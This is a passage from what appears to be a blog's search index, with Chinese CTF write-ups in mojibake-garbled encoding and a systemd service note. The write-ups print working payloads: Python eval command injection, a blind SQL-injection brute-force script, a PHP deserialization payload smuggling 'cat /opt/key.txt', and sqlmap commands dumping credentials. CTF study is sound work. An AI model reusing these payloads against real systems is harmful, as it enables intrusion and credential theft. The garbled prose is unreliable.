å‡ºç°æŠ¥é”™é¡µé¢,æŠ¥é”™æœ€åå‘ç°evalå’Œåˆ¤æ–­ æ ¸å¿ƒä»£ç ,åˆšå¼€å§‹æƒ³åˆ©ç”¨åˆ©ç”¨evalåå¼¹shell,ä½†æ˜¯å¤±è´¥äº† åˆ©ç”¨eval,å¯¼å…¥osåº“,æ‰§è¡Œä»£ç  1http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(%27os%27).popen(%22ls%22).read()) åˆ—ç›®å½•åå‘ç°flag.sh,å†è¯»flag.sh 1[http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(%27os%27).popen(%22cat%20flag.sh%22).read())](http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;1&amp;operator&#x3D;%2B&amp;number2&#x3D;1%2Bint(__import__(&#39;os&#39;).popen(&quot;cat flag.sh&quot;).read())) è¯»å–åˆ°çœŸæ­£çš„flagä½ç½® 1http:&#x2F;&#x2F;124.156.121.112:5000&#x2F;_calculate?number1&#x3D;0&amp;operator&#x3D;%2B&amp;number2&#x3D;0%2Bint(__import__(&#39;os&#39;).popen(&quot;cat%20&#x2F;home&#x2F;ctf&#x2F;web&#x2F;flag&quot;).read()) web_èŒæ–°è®°å¿†dirmapæ‰«ç›®å½•,æ‰«å‡ºåå°ç™»å½• ç™»å½•admin admin,æç¤ºå¯†ç é”™è¯¯,æ”¹å˜ç”¨æˆ·åæç¤ºç”¨æˆ·å/å¯†ç é”™è¯¯ æ¨æ–­æ˜¯å…ˆåˆ¤æ–­ç”¨æˆ·å,åœ¨åˆ¤æ–­å¯†ç ,å°è¯•å¼±å£ä»¤å¯†ç çˆ†ç ´,githubæ‰¾äº†ä¸¤ä¸ªå­—å…¸10000æ¡æ•°æ®bpæ²¡è·‘å‡ºæ¥,å°è¯•sqlæ³¨å…¥,è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦,å¤§è‡´åˆ¤æ–­äº†ä¸€ä¸‹ 1234åˆæ³•| &#39; , length left &lt; substr ç©ºæ ¼è¿‡æ»¤&quot; . or &amp; and ; # + - union select from mid ascii order table &gt; &#x3D; æ³¨é‡Šç¬¦éƒ½è¿‡æ»¤æ‰äº†,ä½†æ˜¯å•ç»™ä¸€ä¸ªå¼•å·ä¼šæŠ¥é”™,æ‰€ä»¥åº”è¯¥æœ‰æ³¨å…¥æ–¹æ³• æœæœæ‰¾æ‰¾,æ‰¾åˆ°å‚è€ƒèµ„æ–™CTFåˆ©ç”¨ Burpsuite Fuzz å®ç° SQL æ³¨å…¥ æ¨æµ‹åº”è¯¥å·®ä¸å¤š,çœ‹æ‡‚ä¹‹å,æµ‹è¯• payload 1234567891011u&#x3D;&#39;||xxx||&#39;&amp;p&#x3D;123#ç¬¬ä¸€ä¸ªéšä¾¿å†™çš„,å°è¯•ä¸€ä¸‹å‘ç°æŠ¥é”™,unknown column#äºæ˜¯å†è¯•u&#x3D;&#39;||u||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(u)&lt;5||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(u)&lt;6||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(pwd)||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(password)||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(p)||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(p)&lt;17||&#39;&amp;p&#x3D;123u&#x3D;&#39;||length(p)&lt;18||&#39;&amp;p&#x3D;123 ä¸Šé¢è¿™äº›å¯ä»¥å¾—åˆ°ä¸€äº›ä¿¡æ¯,è¡¨ä¸­å­—æ®µæ˜¯u,p,è´¦å·æ˜¯admin,å¯†ç æ˜¯17ä½ ç„¶åå°±æ˜¯åˆ©ç”¨ç›¸åŒåŸç†è¿›è¡Œç›²æ³¨äº†è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839import requestss&#x3D;requests.session()url&#x3D;&quot;https:&#x2F;&#x2F;30f04198-23e0-4a0e-a14d-e29e8a13aea6.chall.ctf.show&#x2F;admin&#x2F;checklogin.php&quot;def get_length(): for i in range(1,127): postdata &#x3D; &#123; &#39;u&#39;:&quot;&#39;||length(p)&lt;&quot;+str(i)+&quot;||&#39;&quot;, &#39;p&#39;:&#39;123&#39; &#125; print(i,postdata) r &#x3D; s.post(url,data&#x3D;postdata) if &#39;ç”¨æˆ·å&#39;not in r.text: print(&quot;get length! length&#x3D;&quot;+str(i-1)) return idef get_pwd_char(): pwd &#x3D; &#39;&#39; strs &#x3D; &#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39; for i in range(0,length): for c in strs: postdata &#x3D; &#123; &#39;u&#39;:&quot;&#39;||substr(p,&quot;+str(i+1)+&quot;,1)&lt;&#39;&quot;+str(c), &#39;p&#39;:&#39;123&#39; &#125; # print(i,postdata) r &#x3D; s.post(url&#x3D;url,data&#x3D;postdata) # print(r.text) if &#39;ç”¨æˆ·å&#39; not in r.text and &#39;å¯†ç &#39; in r.text: pwd +&#x3D; chr(ord(c)-1) # print(pwd) break print(chr(ord(c) - 1),end&#x3D;&#39;&#39;) print(&quot;||&quot;+str(i+1),pwd)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: length&#x3D;0 length&#x3D;get_length() #length is 17 get_pwd_char() å¾—åˆ°å¯†ç ,ç™»å½•å¾—flag æ‚é¡¹ç­¾åˆ°é¡µé¢å¦å­˜ä¸º,winhexæ‰“å¼€,æœ€ä¸‹é¢è¯¡å¼‚çš„20 09,20å˜0,09å˜1,è½¬æ¢æˆäºŒè¿›åˆ¶,äºŒè¿›åˆ¶è½¬ASCIIå‘ç°æ˜¯morse,morseè§£ç ,base16è§£å¯† å¾—flag 1flag&#123;MengMengDa&#125; æ‚é¡¹èŒæ–°ç¦åˆ©ä¸‹ä¸‹æ¥,binæ–‡ä»¶,ä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿,ç™¾åº¦ä¸€ä¸ªæ–‡ä»¶æ ¼å¼åˆ†æ,æ˜¯ABR,ç”¨psæ‰“å¼€,ä¸å…¼å®¹,ç¾¤ä¸»æç¤ºå–å,ç”¨010editorå¯¹åå…­è¿›åˆ¶æŒ‰ä½å–å,ä¿å­˜,å†åˆ†æä¸€ä¸‹,å¯èƒ½æ˜¯MP3,MP4ç”¨potplayæ‰“å¼€,å¬å‡ºflag æ‚é¡¹qrcodeè½¬æ¢äºŒç»´ç è„šæœ¬ 1234567891011121314from PIL import ImageMAX &#x3D; 25img &#x3D; Image.new(&quot;RGB&quot;,(MAX,MAX))str&#x3D;&quot;1111111011100111101111111100000101011101000100000110111010010010010010111011011101010000110001011101101110101110110110101110110000010011011001010000011111111010101010101111111000000000011100110000000010000011010010111100110111010010110101100001001101100110100100111101111111111111100000000001101101110100101110100101101001011011011001000100100111111100111111111110110010000000010000011110111100110110010111111010110111111000100000000011101111000110101111111010101100101011011100000100011001110001011110111010010111101111101001011101000011101000110111101110100101000110000111010000010000100100100011101111111010110010101011111&quot;i &#x3D; 0for y in range (0,MAX): for x in range (0,MAX): if(str[i] &#x3D;&#x3D; &#39;1&#39;): img.putpixel([x,y],(0, 0, 0)) else: img.putpixel([x,y],(255,255,255)) i &#x3D; i+1img.show()img.save(&quot;flag.png&quot;) æ‚é¡¹,åƒå­—æ–‡ç”¨Stegsolveæ‰“å¼€,æ¢æ¢é€šé“çœ‹çœ‹,å¤šç‚¹å‡ ä¸‹,å‘ç°ä¸€ä¸ªå¾ˆå¤šç»†å°äºŒç»´ç çš„å›¾ç‰‡,å¦å­˜ä¸º, é¦–å…ˆç”¨åˆ‡å‰²è½¯ä»¶åˆ‡äº†,ç»“æœè¯†åˆ«ä¸å‡ºæ¥,å†ç”¨pythonåˆ‡å‰²,è„šæœ¬ç½‘ä¸Šéƒ½æœ‰,æ‰¾ä¸€ä¸ªæ”¹ä¸€æ”¹ 1234567from PIL import Imagefilename &#x3D; r&#39;2.bmp&#39;img &#x3D; Image.open(filename)for i in range(29): for j in range(29): region &#x3D; img.crop(25 * j, 25 * i, 25 * (j + 1), 25 * (i + 1)) region.save(&#39;out&#x2F;&#123;&#125;&#123;&#125;.png&#39;.format(j, i)) å†ç”¨ç¾¤é‡Œå¤§ä½¬åˆ†äº«çš„å¾®å¾®æ‰¹é‡è¯†åˆ«,åœ¨csvæ–‡ä»¶æŸ¥æ‰¾flag Cryptoå¯†ç å­¦ç­¾åˆ°base85å¾—flag æŠ±æˆ‘åˆ†æé€»è¾‘,æ¯11ä½ä½ä¸€ç»„,ç¬¬ä¸€ä½æ˜¯æ²¡ç”¨çš„å­—ç¬¦,å»æ‰ç¬¬ä¸€ä½,å‰©ä¸‹çš„å°±æ˜¯flagä¸­çš„å­—ç¬¦,å…ˆéå†å‡ºflagä¸­çš„å­—ç¬¦ 123456789101112131415161718192021222324252627282930import randomcstring &#x3D; &#39;abcdefghijklmnopqrstuvwxyz&#123;&#125;_0123456789&#39;key &#x3D; &#39;flag&#123;********&#125;&#39;length &#x3D; 300def encode(): res &#x3D; &#39;&#39; for i in range(1, length): c &#x3D; random.randint(0, 36) # print(c) res +&#x3D; cstring[c] # print(res) for n in range(10): c &#x3D; random.randint(0, len(key) - 1) res +&#x3D; key[c] # print(res) return res# encode()str &#x3D; &quot;qdfl33&#123;6&#123;6gs3afa6&#123;3&#125;agf&#123;&#125;aagdf&#125;6fl36d&#123;dfl&#123;6ay6gafddfg&#125;&#123;j3f&#125;&#125;6la&#123;3&#125;bfdf3&#125;gla&#125;65&#125;lg6g6dflf0&#123;dfgd3fdfgc&#123;g6a&#125;a3&#123;6&#125;mfa&#123;&#125;f&#125;f&#125;&#125;&#125;3363&#125;&#125;f6a6a7g&#123;a&#125;g66&#123;d3xgfffg&#125;a&#125;3&#125;_&#123;lad&#125;a33ga5fd33&#125;&#123;&#123;dl&#125;&#123;&#125;f&#123;3da&#125;g&#125;3egfal&#123;a3l&#125;3f33&#125;dfdda&#123;3sa&#123;d6g&#123;ff&#125;6vgl33d6g333h&#123;gd&#123;&#123;lg6ldg&#123;ad&#123;3333a6oalf6a&#123;33&#123;de3&#123;fa&#125;ggl&#123;abfd&#125;6&#125;6&#125;&#125;l33fa&#125;f&#123;&#123;3&#123;3fla&#125;a6&#125;af&#125;&#123;amg&#125;&#123;&#123;d&#125;&#125;a6gallfg36&#123;g3dh&#123;&#123;&#123;a&#123;lfg3&#123;sll6g6gfaggid6d&#123;3afl&#125;3rff3gfad3d&#125;1dlllff6&#125;6&#125;h3g66gla336b&#123;6d3gf&#125;f&#123;30d63l&#125;3dfl6a3llfgld3&#123;&#125;qg&#125;gf&#125;dg&#123;6l&#125;3gal&#125;agdl6&#123;lg&#123;g&#125;ddfaaealf&#123;f3llgge3ad3&#123;3adf&#123;c&#125;fllf6f&#125;3at&#123;aag&#125;a66d3&#125;ad&#123;dfg&#123;&#125;dlz6gld&#125;6&#123;3flxgf&#123;3g3ald&#125;3g&#125;g63f6ggf3&#125;gfd&#125;f3ga3efllf6&#125;363fu6366fdlggfx6&#125;6l3&#125;&#125;a&#123;afg&#123;&#123;&#125;&#125;3fdaluaa&#125;al&#123;dg3dpfga&#125;&#125;l&#125;d3l4afg&#125;f&#123;d&#123;lgcfgffglal&#125;dq6l&#125;fgflldavdad6&#125;df&#123;&#125;dw&#125;l6g&#125;&#125;&#123;l3gf6fdaa66aadt&#125;f6lg&#123;dg33h&#123;fa3d&#123;&#125;laao3l6aal&#123;lfdv&#123;3dlf6af36bddg&#125;3ggad3o&#125;&#123;&#125;3g3fgddyffd3lddgdd6&#123;gdfl&#123;&#123;la3ild&#125;dg&#123;g&#125;dgef&#123;a3&#123;d6dfgq3adll&#123;fdadt&#125;66fdflg&#123;3x&#123;l3ll&#125;3&#123;&#123;g4a3af6lag3gdaf66dadg6dfglaf66l3f&#123;2&#125;6&#123;afaf&#125;3l6all&#125;&#123;l&#125;lfdla6&#123;fgff&#123;&#125;g13dl&#123;a&#123;6&#123;l6rd6&#125;&#125;l3dgg3_f&#123;66gll&#123;f6a3d3dga6&#123;lg&#125;&#123;g&#125;d&#123;6&#123;d36lll3dd6&#123;3dg3afal&#125;d&#125;gff26&#125;l&#125;al&#125;&#125;&#123;a6&#125;g66gaaff&#125;0fga&#123;g6dfld&#123;&#123;&#125;fglf&#123;af&#125;iddf6g6&#125;l361&#123;ag&#125;&#123;&#123;dlfak&#125;&#123;d3fa&#123;6&#123;godgg&#123;l36a&#123;gmllgfa3fa&#123;&#125;f&#125;&#125;3&#123;a6&#123;a3&#123;nafg&#123;l3d6&#125;g2lf6&#123;gg&#125;&#123;g&#125;sg&#123;ga&#123;63g&#123;&#125;la6g&#123;g6&#123;&#123;63o6&#123;l&#125;&#123;3&#125;l3ag36&#123;af33g3dw6d33f3lfdan&#123;dddad&#123;&#123;6l6&#125;&#125;fad63lgd1ffaa&#125;g&#125;3flkg3d&#125;aalf3lbgf&#123;g&#125;f&#125;&#125;d3agf&#123;ld&#123;dl3l4fl&#123;&#123;3fla&#125;&#125;r3g&#125;&#123;&#125;gda&#123;&#125;_df3g&#125;fa36gq&#125;la&#123;f&#123;6l&#125;66fgdg&#125;6ag6feaal6all3&#123;d&#125;lfgl&#125;&#125;&#123;&#123;6lal&#125;gf&#125;&#125;gfgd4d&#123;g36daff&#125;l6fd63ag6&#125;f7&#125;l3&#123;&#123;d&#125;&#123;al6lff66gda&#125;f7dfaf6&#125;fd3ldfgfl36gf337a6al663afd&#123;dff&#125;6&#125;df&#123;lt&#125;66&#125;ag6a3&#123;na&#125;3la&#123;6daa&#125;63fgldf3ggcl6dd&#123;3fg&#123;&#125;&#125;gfgaf&#123;633lpfadalldgglg&#123;l&#125;&#123;6&#125;gf&#123;agf6&#123;3l3a366wa6l6&#125;fdla&#125;wfl&#125;33&#125;d&#123;6d6aa&#125;laldag&#125;bgaa3gff&#125;3db&#123;gd&#125;lfga3&#123;&#125;ffddd6&#125;&#123;la4&#125;3&#123;agdg3&#123;&#125;bf33adg3a632d&#125;66f&#125;dgd67&#125;&#123;333dfg&#125;&#125;mgg3all3l&#125;fd6dd3&#123;g&#125;&#123;&#125;&#125;v6&#125;a6f6lgd3nfgg6aff3a&#125;d3da&#123;l3ldldz&#123;&#125;&#123;&#125;g3&#125;6fdg6f&#123;gd&#123;g3adx&#123;gll6&#123;fg3dc63lf&#125;6dl&#123;d63f3g&#123;3adda5f3dgfla3&#123;6&#125;gd&#123;3&#123;d6dlldal6g66&#125;&#123;ddp&#125;lalafd&#125;d&#123;lgl&#125;g6g33agjg&#125;33dgf&#125;lg0adlda6gfdlx&#123;3g&#125;&#123;g3a&#123;a76&#125;gdf3la&#125;lh&#125;l&#123;l&#123;&#125;&#125;a6gm&#123;gdd&#123;agg&#125;6xfgg&#125;&#123;336&#125;d_a&#123;df3&#125;df33jgf&#125;6d3&#125;&#125;f&#125;h3l&#123;6ga6fll2&#125;dd&#123;l36d66&#125;ldafdlga3gbgd&#125;d6df&#125;ff1gf6a&#123;ll3a3w&#123;3g&#125;allfafldal&#125;aal&#125;dlra33l3f&#125;3dff&#123;6&#123;6&#125;f&#125;la&#125;lgf&#125;&#125;&#125;gd&#123;f3z3l3&#123;d3636dpl3fag3&#123;faa1&#123;3ga33l&#125;6ll6&#123;gg6&#125;ddf&#125;t6g&#125;&#123;gl6ggl&#123;d&#125;aafalf&#123;lw6a&#123;dad&#125;&#125;a3x&#123;ada&#123;fg6d&#125;a3g&#123;d&#123;fggdawdfal&#123;&#123;3dlfndl636&#125;36alv633ada6gf6hd&#123;3l66ddlfpglda&#125;&#123;g3fdogdfa3&#125;3g&#125;3k3d3gda33&#125;dvd&#125;laa&#123;fa&#123;a&#123;&#123;&#125;a&#125;36&#125;&#125;&#125;&#123;r6d6&#123;a6&#125;&#125;6&#123;0laa36gd&#123;36kf63a&#123;3&#125;gga4af6&#125;f3gfgf0lf&#123;6g&#125;&#123;&#123;6&#125;pafg6dg&#125;g6&#123;b&#125;3d36ad6d&#123;h6f3agff&#125;63p&#125;&#123;l3ag3&#125;lf1f3dgd&#123;66a37&#125;&#125;&#125;d6gglaftaf3l6a3&#123;&#123;a7&#123;lgd3d&#125;fl6tlfl663lgg3wa&#125;33gl&#125;d&#123;3i6aaagl6&#123;&#123;&#125;n3gd&#125;l3l6&#125;l7a&#123;gf&#123;a&#125;l&#125;f3al&#123;alg63fln&#123;&#123;dd&#125;3l&#123;ll1&#125;&#123;3g&#125;6&#123;6&#125;&#123;u63&#123;f3&#123;g6lgf&#123;3d&#125;&#123;636&#125;&#123;u3&#125;&#123;f6d&#123;&#123;d3lg&#123;3l6aldf&#123;i&#123;f366&#123;f3l&#123;eg&#123;d&#123;gll&#123;3dhgdgfgaf&#123;&#125;&#125;g&#125;&#123;lg3&#123;a&#123;flm&#125;fa3ldf&#123;d32fagllf&#123;&#123;66q363&#125;dl66gg2fa6af6d6g37lffl&#123;d&#123;3lltgl33&#125;&#125;&#123;&#125;d3o&#123;lfld3d&#123;&#125;a6a663a66&#123;fabfd6ld333g3rafa&#125;&#125;fddfgt&#123;ggad3ag&#125;lr63af6lgg&#125;gy&#123;6&#123;&#123;6&#125;6dd626&#123;gl6a&#123;ad3b3df&#125;alf3afdaf66ll&#125;lf6jd&#125;3&#123;6dldfgg&#125;f3lg63l&#123;lr3ff3l&#123;gafaa&#125;f&#125;agl6l33xglfggg&#123;&#123;&#123;fq66&#125;g6lfa3&#123;736lllflalglf&#125;&#123;&#125;gf&#123;aggdg3&#123;a&#125;&#125;da&#123;fp6fglla3l&#125;65gf36&#123;l6dl&#125;g&#125;f&#123;la6&#123;l&#123;fpf&#123;&#125;63&#123;f6gdfaalf6&#123;dffgdgf&#123;lgaf&#123;f&#123;56&#125;g6af63l6a&#125;a&#125;&#123;lfa&#123;3gblda&#125;l&#125;&#123;fl&#123;s&#123;g&#125;&#125;6&#123;g6la56g6g3&#123;f&#125;ddfaa&#123;l&#125;dg6g&#125;0glda6&#123;6d&#125;ff&#125;f&#123;6laadd6zaag&#123;l3l&#125;6dc&#125;f3gg&#125;lffgsag&#125;l3l6d3apd3gd3fd&#125;&#125;aga3ga&#125;a3&#123;6f1f3df&#123;&#123;d&#125;&#125;av3laf&#125;6adf3_d&#123;afa6f&#125;adt&#123;faf&#123;d33aaol3&#125;&#123;l&#125;ld&#125;3yl3a6a&#123;fa6&#125;_d33gf3fll&#125;of&#123;6lad&#125;&#125;fdx&#125;6d&#123;f&#125;ll63ugag66d&#123;6f3&#125;33&#125;al6l&#123;ffwf&#123;&#125;&#123;fl3a36ogg3&#123;&#125;&#125;g6&#125;3hl&#125;6dg6ld&#123;digaa&#125;g&#125;&#123;&#123;l&#125;da&#123;ddg3&#123;&#123;d&#125;w3&#125;ld&#125;adgg3m&#123;lad&#123;gd&#123;a&#123;7afff&#125;&#123;d6&#125;fsf3&#123;f&#125;gflgavfldg6a6&#123;ldqf&#125;fd&#123;f3f3&#125;73ddad&#123;666fz6&#125;d&#123;3&#123;l36a1d6fal3fl6lrl&#123;&#125;aga&#123;fdlsa&#125;&#123;6l6ag3gtgdg&#123;6lgf3f&quot;lengths &#x3D; len(str)flag &#x3D; &quot;&quot;for i in range(0, lengths): if i % 11 !&#x3D; 0: if str[i] not in flag: flag +&#x3D; str[i]print(flag) å†æŠŠç»“æœä¸­çš„å‡ ä¸ªå­—ç¬¦æ‹¼æˆä¸€å¥è¯ å¦ˆå‘€_å®Œäº†ç¾¤ä¸»æç¤ºå°±å·®æŠŠç­”æ¡ˆè¯´å‡ºæ¥äº†.äºŒè¿›åˆ¶è½¬asciiå¾—åˆ°å¯†æ–‡,AESåŠ è§£å¯†,å¯†åŒ™æ˜¯20121221å¾—flag","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"linuxæœåŠ¡ç®¡ç†","date":"2020-02-29T16:00:00.000Z","path":"2020/03/01/Note/linuxæœåŠ¡ç®¡ç†/","text":"linuxæœåŠ¡ç®¡ç†åœ¨ System V(SysV)ç³»ç»Ÿä¸­æŸ¥çœ‹è¿è¡Œçš„æœåŠ¡â€”â€”service123456789101112#æ˜¾ç¤ºå…¨éƒ¨service --status-all#æ˜¾ç¤ºå¤šæ•°service --status-all | more#æ˜¾ç¤ºå°‘æ•°service --status-all | less#æ­£åœ¨è¿è¡Œservice --status-all | grep running#æŸ¥çœ‹æŒ‡å®šæœåŠ¡service --status-all | grep httpdorservice httpd status systemd ç³»ç»Ÿä¸­ç®¡ç†è¿è¡Œçš„æœåŠ¡â€”â€”systemctlæŸ¥çœ‹12345678910111213141516#åˆ—å‡ºç³»ç»Ÿä¸­æœåŠ¡systemctl#æ ¹æ®ç±»å‹åˆ—å‡ºå•å…ƒsystemctl list-units --type service#æ ¹æ®çŠ¶æ€åˆ—å‡ºå•ä½systemctl list-unit-files --type service#æŸ¥çœ‹è¿è¡Œä¸­çš„æœåŠ¡systemctl | grep running#æŸ¥çœ‹ç³»ç»Ÿå¯åŠ¨æ—¶ä¼šè¢«å¯ç”¨çš„æœåŠ¡åˆ—è¡¨systemctl list-unit-files | grep enabled#æŸ¥çœ‹æŒ‡å®šæœåŠ¡systemctl | grep apache2orsystemctl status apache2#æŒ‰èµ„æºä½¿ç”¨æƒ…å†µï¼ˆä»»åŠ¡ã€CPUã€å†…å­˜ã€è¾“å…¥å’Œè¾“å‡ºï¼‰åˆ—å‡ºæ§åˆ¶ç»„ï¼šsystemd-cgtop UNIT ç›¸åº”çš„ systemd å•å…ƒåç§° LOAD ç›¸åº”çš„å•å…ƒæ˜¯å¦è¢«åŠ è½½åˆ°å†…å­˜ä¸­ ACTIVE è¯¥å•å…ƒæ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ SUB è¯¥å•å…ƒæ˜¯å¦å¤„äºè¿è¡ŒçŠ¶æ€ï¼ˆLCTT è¯‘æ³¨ï¼šæ˜¯è¾ƒäº ACTIVE æ›´åŠ è¯¦ç»†çš„çŠ¶æ€æè¿°ï¼Œä¸åŒçš„å•å…ƒç±»å‹æœ‰ä¸åŒçš„çŠ¶æ€ã€‚ï¼‰ DESCRIPTION å…³äºè¯¥å•å…ƒçš„ç®€çŸ­æè¿° æ³¨å†ŒæœåŠ¡1234567#é…ç½®æ–‡ä»¶ç›®å½•#systemctlè„šæœ¬ç›®å½•ï¼š&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;#ç³»ç»ŸæœåŠ¡ç›®å½•ï¼š&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;#ç”¨æˆ·æœåŠ¡ç›®å½•usr&#x2F;lib&#x2F;systemd&#x2F;user&#x2F; ç¬¬ä¸€æ­¥ 1234567891011121314151617181920212223242526272829303132333435363738394041424344åœ¨&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;systemç›®å½•ä¸‹æ–°å»ºservice-name.serviceæ–‡ä»¶ï¼š#nginx.serviceæ–‡ä»¶ç¤ºä¾‹# Stop dance for nginx# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;## ExecStop sends SIGSTOP (graceful stop) to the nginx process.# If, after 5s (--retry QUIT&#x2F;5) nginx is still running, systemd takes control# and sends SIGTERM (fast shutdown) to the main process.# After another 5s (TimeoutStopSec&#x3D;5), and if nginx is alive, systemd sends# SIGKILL to all the remaining processes in the process group (KillMode&#x3D;mixed).## nginx signals reference doc:# http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F;control.html#[Unit]#æœåŠ¡æè¿°Description&#x3D;A high performance web server and a reverse proxy serverDocumentation&#x3D;man:nginx(8)#æŒ‡å®šäº†åœ¨systemdåœ¨æ‰§è¡Œå®Œé‚£äº›targetä¹‹åå†å¯åŠ¨è¯¥æœåŠ¡After&#x3D;network.target nss-lookup.target[Service]#å®šä¹‰Serviceçš„è¿è¡Œç±»å‹ï¼Œä¸€èˆ¬æ˜¯forking(åå°è¿è¡Œ) Type&#x3D;forkingPIDFile&#x3D;&#x2F;run&#x2F;nginx.pid#å®šä¹‰systemctl start|stop|reload *.service çš„æ‰§è¡Œæ–¹æ³•ï¼ˆå…·ä½“å‘½ä»¤éœ€è¦å†™ç»å¯¹è·¯å¾„ï¼‰#å¯åŠ¨å‰æ‰§è¡Œçš„å‘½ä»¤ExecStartPre&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -t -q -g &#39;daemon on; master_process on;&#39;#å¯åŠ¨æ—¶æ‰§è¡Œçš„å‘½ä»¤ExecStart&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -g &#39;daemon on; master_process on;&#39;#é‡å¯æ—¶æ‰§è¡Œçš„å‘½ä»¤ExecReload&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -g &#39;daemon on; master_process on;&#39; -s reload#åœæ­¢æ—¶æ‰§è¡Œçš„å‘½ä»¤ExecStop&#x3D;-&#x2F;sbin&#x2F;start-stop-daemon --quiet --stop --retry QUIT&#x2F;5 --pidfile &#x2F;run&#x2F;nginx.pid#åœæ­¢æœåŠ¡æ—¶çš„ç­‰å¾…çš„ç§’æ•°,å¦‚æœè¶…è¿‡è¿™ä¸ªæ—¶é—´æœåŠ¡ä»ç„¶æ²¡æœ‰åœæ­¢,systemdä¼šä½¿ç”¨SIGKILLä¿¡å·å¼ºè¡Œæ€æ­»æœåŠ¡çš„è¿›ç¨‹ã€‚ TimeoutStopSec&#x3D;5KillMode&#x3D;mixed#åˆ›å»ºç§æœ‰çš„å†…å­˜ä¸´æ—¶ç©ºé—´PrivateTmp&#x3D;True[Install]#å¤šç”¨æˆ·WantedBy&#x3D;multi-user.target ç¬¬äºŒæ­¥ æ”¹æƒé™ 1chmod 754 æ–‡ä»¶å ç¬¬ä¸‰æ­¥ 1234567891011#é‡è½½ç³»ç»ŸæœåŠ¡ï¼šsystemctl daemon-reload#ä¸€äº›å‘½ä»¤#è®¾ç½®å¼€æœºå¯åŠ¨ï¼šsystemctl enable *.service#å¯åŠ¨æœåŠ¡ï¼šsystemctl start *.service#åœæ­¢æœåŠ¡ï¼šsystemctl stop *.service#é‡å¯æœåŠ¡ï¼šsystemctl reload *.service","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"linux","slug":"linux","permalink":"https://yanmymickey.github.io/tags/linux/"}]},{"title":"åˆå¤©å¾¡å®…æˆ˜ç–«-web-wp","date":"2020-02-28T16:00:00.000Z","path":"2020/02/29/CTF_WP/hetian/","text":"åˆå¤©å¾¡å®…æˆ˜ç–«-web-wpç­¾åˆ° å¦‚å›¾æ‰€ç¤º æ”¹æˆkey{XXXX}æäº¤ è„‘è¢‹æœ‰ç‚¹å¤§ç”¨bpæŠ“åŒ…,åœ¨å“åº”ä¸­æ‰¾åˆ°key ç»Ÿä¸€ç™»å½•æ‰“å¼€ç•Œé¢,è¦ç™»é™†,ç™»å½•ä¸ä¸Š,ç”¨dirmapæ‰«ä¸€ä¸‹ç›®å½• æ‰¾åˆ°æºç æ³„éœ²,ä¸‹è½½ä¸‹æ¥ ä»£ç å®¡è®¡ åœ¨commonæ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°home.php,wakeupå‡½æ•°æœ‰ä¸€ä¸ªwafè¿‡æ»¤,æœ€ä¸‹æ–¹çš„ 12$a&#x3D;@$_POST[&#39;a&#39;];@unserialize($a); å¯ä»¥æƒ³åˆ°æ„é€ ååºåˆ—åŒ–å¯¹è±¡,ç›´æ¥æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„å¯¹è±¡,åˆ©ç”¨systemå‡½æ•°,homeåé¢çš„æ•°å­—å¤§äº2å¯ä»¥ç»•è¿‡wakeupå‡½æ•°ä»è€Œç»•è¿‡è¿‡æ»¤ æ„é€ payload 1a&#x3D;O:4:&quot;home&quot;:3:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:26:&quot;127.0.0.1;cat &#x2F;opt&#x2F;key.txt&quot;;&#125;&#125; åå°key å­˜åœ¨æ•°å­—å‹sqlæ³¨å…¥ ç”¨sqlmapè·‘ä¸€ä¸‹ çˆ†åº“ 1sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot; -p &quot;cid&quot; --dbs çˆ†è¡¨ 1sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot; -p &quot;cid&quot; -D seacms --tables çˆ†å­—æ®µ 1sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot; -p &quot;cid&quot; -D seacms -T manage --columns çˆ†å†…å®¹ 1sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot; -p &quot;cid&quot; -D seacms -T manage -C user,password --dump å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç å,ç”±äºå¯†ç MD5åŠ 